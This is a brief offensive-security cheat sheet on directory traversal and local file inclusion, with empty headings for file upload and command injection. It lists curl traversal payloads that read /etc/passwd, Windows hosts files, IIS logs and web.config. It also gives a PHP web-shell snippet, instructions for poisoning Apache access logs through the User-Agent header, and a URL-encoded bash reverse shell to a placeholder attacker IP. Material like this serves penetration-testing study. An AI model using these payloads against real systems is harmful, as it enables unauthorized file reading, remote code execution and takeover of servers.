# Directory traversal

Example: `curl http://vulnsite/index.php?page=../../../../../../etc/passwd`
Windows (check both `/` and `\`):
```
curl http://vulnsite/index.php?page=..\..\..\..\..\..\Windows\System32\drivers\etc\hosts
curl http://vulnsite/index.php?page=../../../../../../inetpub\logs\LogFiles\W3SVC1\
curl http://vulnsite/index.php?page=../../../../../../wwwroot\web.config
```

Grafana CVE: https://golangexample.com/cve-2021-43798-grafana-8-x-path-traversal-pre-auth/ \
Apache 2.4.49 CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773

## File inclusion

Php snipet:
```
<?php echo system($_GET['cmd']);?>
```
and poison the log files with a Header (e.g. [User-Agent](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent)) or another user controled field. Then traverse the directories to the log file:
```
http://sitetohack/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F___AttackerIP___%2F___AttackerPort___%200%3E%261%22
```

## File upload

## Command injection


